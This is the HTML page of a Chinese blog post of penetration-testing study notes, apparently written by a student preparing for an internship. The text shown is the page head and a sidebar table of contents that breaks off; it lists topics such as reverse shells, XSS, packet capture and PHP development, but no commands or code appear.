<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"6pc1.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/./search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试学习之路">
<meta property="og:url" content="http://6pc1.github.io/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
<meta property="og:site_name" content="6pc1&#39;s blog">
<meta property="og:description" content="已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/0f5af17a529d67961e925aa6be75884d--b4a3--image-20240404103555177.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/be974f59bf0db22217dce306e355ddd9--17d0--image-20240404165012897.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/5f41dabeda66c8cc8e5875e43621f7e5--1cc9--image-20240404193535385.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-05/091f0354f3dfee15ffed99be242aef22--27f7--image-20240405104254959.png">
<meta property="og:image" content="https://image.3001.net/images/20200921/1600691018_5f689b4a264c5e1261c28.png!small">
<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/607f655f46a045e68d3aa0053dfd2857.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5782d6c9d75646441930bebec4b15949.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/755bc63622561d92fa1c9ad2a5c7795c--c69c--image-20240408163202959.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/66393751a8de0328edac9bcaadad6294--9492--image-20240408163401656.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-08/52659ecc6bacdd0f317d4bee44f90b4e--5e82--image-20240408163812708.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/42d2d6e5485a227110735fafee311311--dfb4--image-20240511083406029.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/67e4aaa79b879330b771633d8535143b--cf65--image-20240511083808897.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/6344854276615d72961db5c984fa1edc--d69d--image-20240511084449143.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/dd504fe86d60d41e5d808e194e458ce4--d9ee--image-20240511090624508.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/63f4b1a104567b33b43cd8c1f8be375b--3e6f--image-20240511091624701.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/19753b8cfc1445cd20e5cd78f4224ff4--c9fc--image-20240511091655868.png">
<meta property="og:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/3d6e827033023f8a4d370bc1daaf216a--0495--image-20240511092308716.png">
<meta property="article:published_time" content="2023-11-28T11:35:52.000Z">
<meta property="article:modified_time" content="2024-05-11T01:28:51.917Z">
<meta property="article:author" content="6pc1">
<meta property="article:tag" content="渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/0f5af17a529d67961e925aa6be75884d--b4a3--image-20240404103555177.png">


<link rel="canonical" href="http://6pc1.github.io/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://6pc1.github.io/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","path":"2023/11/28/渗透测试学习之路/","title":"渗透测试学习之路"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>渗透测试学习之路 | 6pc1's blog</title>
  







<link rel="dns-prefetch" href="waline-server-pi-one.vercel.app">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">6pc1's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">世界如画，心中有梦!</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%E3%80%81%E7%AC%AC1%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%90%8D%E8%AF%8D-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%8F%8D%E5%BC%B9SHELL-%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E5%86%85%E7%BD%91%E4%B8%8E%E5%A4%96%E7%BD%91%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.1.</span> <span class="nav-text">1、内网与外网的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%87%BA%E7%BD%91%E5%92%8C%E8%BF%9B%E7%BD%91"><span class="nav-number">1.2.</span> <span class="nav-text">2、出网和进网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.</span> <span class="nav-text">3、反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E5%AE%9E%E6%88%98"><span class="nav-number">1.4.</span> <span class="nav-text">4、实战</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%E3%80%81%E7%AC%AC2%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-Web%E5%BA%94%E7%94%A8-%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA-%E6%BC%8F%E6%B4%9E-HTTP%E6%95%B0%E6%8D%AE%E5%8C%85-%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E7%BD%91%E7%AB%99%E7%9A%84%E5%BC%80%E5%8F%91"><span class="nav-number">2.1.</span> <span class="nav-text">1、网站的开发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6"><span class="nav-number">2.2.</span> <span class="nav-text">2、web应用框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E4%BB%A3%E7%90%86%E4%BB%A5%E5%8F%8A%E6%8A%93%E5%8C%85"><span class="nav-number">2.3.</span> <span class="nav-text">3、代理以及抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E4%BB%A3%E7%90%86%E8%B4%AD%E4%B9%B0%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">4、代理购买的作用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC3%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%8A%93%E5%8C%85-%E5%B0%81%E5%8C%85-%E5%8D%8F%E8%AE%AE-APP-%E5%B0%8F%E7%A8%8B%E5%BA%8F-PC%E5%BA%94-WEB%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E9%87%8D%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">3.1.</span> <span class="nav-text">1、重点总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E6%89%8B%E6%9C%BAAPP%E3%80%81%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%93%E5%8C%85"><span class="nav-number">3.2.</span> <span class="nav-text">2、手机APP、小程序的抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%85%A8%E5%B1%80%E5%8D%8F%E8%AE%AE%E6%8A%93%E5%8C%85"><span class="nav-number">3.3.</span> <span class="nav-text">3、全局协议抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E5%B0%81%E5%8C%85"><span class="nav-number">3.4.</span> <span class="nav-text">4、封包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E7%9B%B8%E5%85%B3%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.5.</span> <span class="nav-text">5、相关软件的介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC4%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-30%E4%BD%99%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E8%BF%9B%E5%88%B6-Web-%E6%95%B0%E6%8D%AE%E5%BA%93-%E7%B3%BB%E7%BB%9F-%E4%BB%A3%E7%A0%81-%E5%8F%82%E6%95%B0%E5%80%BC"><span class="nav-number">4.</span> <span class="nav-text">第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%96%87%E4%BB%B6%E5%8A%A0%E5%AF%86"><span class="nav-number">4.1.</span> <span class="nav-text">1、文件加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%AF%B9%E7%BC%96%E7%A0%81%E7%9A%84%E8%A7%82%E5%AF%9F"><span class="nav-number">4.2.</span> <span class="nav-text">2、对编码的观察</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">4.3.</span> <span class="nav-text">3、总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC5%E5%A4%A9%EF%BC%9A%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E8%B5%84%E4%BA%A7%E6%9E%B6%E6%9E%84-%E7%AB%AF%E5%8F%A3-%E5%BA%94%E7%94%A8-CDN-WAF-%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="nav-number">5.</span> <span class="nav-text">第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81CDN%E5%92%8C%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="nav-number">5.1.</span> <span class="nav-text">1、CDN和负载均衡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81web%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">5.2.</span> <span class="nav-text">2、web安全问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E7%95%AA%E5%A4%96%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">5.3.</span> <span class="nav-text">3、番外安全问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E3%80%81%E4%B8%80%E4%BA%9B%E9%98%BB%E7%A2%8D"><span class="nav-number">5.4.</span> <span class="nav-text">4、一些阻碍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">5.5.</span> <span class="nav-text">5、总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC6%E5%A4%A9%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-Web%E6%9E%B6%E6%9E%84%E7%AF%87-%E5%9F%9F%E5%90%8D-%E8%AF%AD%E8%A8%80-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%BA%93-%E7%B3%BB%E7%BB%9F-%E6%BA%90%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-number">6.</span> <span class="nav-text">第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC7%E5%A4%A9%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E8%B5%84%E4%BA%A7%E6%B3%84%E6%BC%8F-CMS%E8%AF%86%E5%88%AB-Git%E7%9B%91%E6%8E%A7-SVN-DS-Store-%E5%A4%87%E4%BB%BD"><span class="nav-number">7.</span> <span class="nav-text">第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC8%E5%A4%A9-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%B3%BB%E7%BB%9F%E7%AF%87-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-CDN%E6%9C%8D%E5%8A%A1-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-WAF%E9%98%B2%E7%81%AB%E5%A2%99"><span class="nav-number">8.</span> <span class="nav-text">第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC9%E5%A4%A9-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%83%A7%E8%BF%87%E7%AF%87-%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%93%BE8%E6%8E%A5%E5%8F%A3%E6%8E%A2%E9%92%88-%E5%85%A8%E7%BD%91%E6%89%AB%E6%8C%87-%E5%8F%8D%E5%90%91%E4%BB%B6"><span class="nav-number">9.</span> <span class="nav-text">第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC10%E5%A4%A9-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AF%87-%E6%8A%93%E5%8C%85%E5%B0%81%E5%8C%85-XP%E6%A1%86%E6%9E%B6-%E5%8F%8D%E7%BC%96%E8%AF%91-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96"><span class="nav-number">10.</span> <span class="nav-text">第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC11%E5%A4%A9%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%BA%A2%E9%98%9F%E5%B7%A5%E5%85%B7%E7%AF%87-Fofa-Quake-Kunyu-Suize%E6%B0%B4%E6%B3%BD-Ar%E7%81%AF%E5%A1%94"><span class="nav-number">11.</span> <span class="nav-text">第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC12%E5%A4%A9%EF%BC%9APHP%E5%BC%80%E5%8F%91-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE-%E6%96%87%E7%AB%A0%E5%8A%9F%E8%83%BD%E6%98%BE%E7%A4%BA-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C-%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%97"><span class="nav-number">12.</span> <span class="nav-text">第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC13%E5%A4%A9-PHP%E5%BC%80%E5%8F%91%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE8-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB-%E7%BC%96%E8%BE%91%E5%99%A8-%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E5%88%A0%E9%99%A4%E8%AF%BB%E5%86%99"><span class="nav-number">13.</span> <span class="nav-text">第13天 PHP开发个人博客项目8&amp;文件操作类&amp;编辑器&amp;上传下载删除读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">13.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%B0%8F%E8%BF%AA%E5%8D%9A%E5%AE%A2-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4-%E8%AF%BB%E5%8F%96-%E5%86%99%E5%85%A5%E7%AD%89"><span class="nav-number">13.0.0.2.</span> <span class="nav-text">演示案例：小迪博客-文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC14%E5%A4%A9-PHP%E5%BC%80%E5%8F%91-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE8%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%B1%BB-%E7%95%99%E8%A8%80%E6%9D%BF8%E8%AE%BF%E9%97%AEIP-UA%E5%A4%B4%E6%9D%A5%E6%BA%90"><span class="nav-number">14.</span> <span class="nav-text">第14天 PHP开发-个人博客项目8输入输出类&amp;留言板8访问IP&amp;UA头来源</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-1"><span class="nav-number">14.0.0.1.</span> <span class="nav-text">知识点：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81PHP-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-SERVER"><span class="nav-number">14.0.0.1.1.</span> <span class="nav-text">1、PHP-全局变量_SERVER</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81MYSQL-%E6%8F%92%E5%85%A5%E8%AF%AD%E6%B3%95INSERT"><span class="nav-number">14.0.0.1.2.</span> <span class="nav-text">2、MYSQL-插入语法INSERT</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%E3%80%81%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA-XSS-%E5%8F%8D%E5%B0%84-%E5%AD%98%E5%82%A8"><span class="nav-number">14.0.0.1.3.</span> <span class="nav-text">3、输入输出-XSS&amp;反射&amp;存储</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4%E3%80%81%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-XSS%E8%B7%A8%E7%AB%99-CSRF%E7%AD%89"><span class="nav-number">14.0.0.1.4.</span> <span class="nav-text">4、安全问题-XSS跨站&amp;CSRF等</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="nav-number">14.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E8%BF%AA%E5%8D%9A%E5%AE%A2%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA-%E7%95%99%E8%A8%80%E6%9D%BF-%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96"><span class="nav-number">14.0.0.2.1.</span> <span class="nav-text">小迪博客输入输出&amp;留言板&amp;访问获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A2%A8%E8%80%85%E9%9D%B6%E5%9C%BA-IP%E5%9C%B0%E5%9D%80%E4%BC%AA%E9%80%A0%E6%9D%A5%E6%BA%90-%E6%9D%A5%E6%BA%90%E9%A1%B5%E4%BC%AA%E9%80%A0"><span class="nav-number">14.0.0.2.2.</span> <span class="nav-text">墨者靶场-IP地址伪造来源&amp;来源页伪造</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC15%E5%A4%A9-PHP%E5%BC%80%E5%8F%91-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81-Cookie-Session-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8"><span class="nav-number">15.</span> <span class="nav-text">第15天 PHP开发-个人博客项目&amp;登录验证&amp;Cookie&amp;Session&amp;验证码安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-2"><span class="nav-number">15.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">15.0.0.2.</span> <span class="nav-text">登录验证的流程：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B"><span class="nav-number">15.0.0.3.</span> <span class="nav-text">演示案例</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC16%E5%A4%A9-PHP%E5%BC%80%E5%8F%91-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE-JS-Ajax-%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91-%E8%B4%AD%E7%89%A9-%E7%99%BB%E5%BD%95-%E4%B8%8A%E4%BC%A0"><span class="nav-number">16.</span> <span class="nav-text">第16天 PHP开发-个人博客项目&amp;JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">16.0.0.1.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81Js%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">16.0.0.1.1.</span> <span class="nav-text">1、Js前端验证-文件上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81Js-Ajax%E4%BC%A0%E9%80%92-%E7%99%BB%E5%BD%95-%E7%8A%B6%E6%80%81"><span class="nav-number">16.0.0.1.2.</span> <span class="nav-text">2、Js-Ajax传递-登录-状态</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%E3%80%81JS-Ajax%E4%BC%A0%E9%80%92-%E8%B4%AD%E7%89%A9-%E5%8F%82%E6%95%B0"><span class="nav-number">16.0.0.1.3.</span> <span class="nav-text">3、JS-Ajax传递-购物-参数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%B1%BB%E5%9E%8B-%E8%BF%87%E6%BB%A4"><span class="nav-number">16.0.0.1.3.1.</span> <span class="nav-text">1、文件上传-类型-过滤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 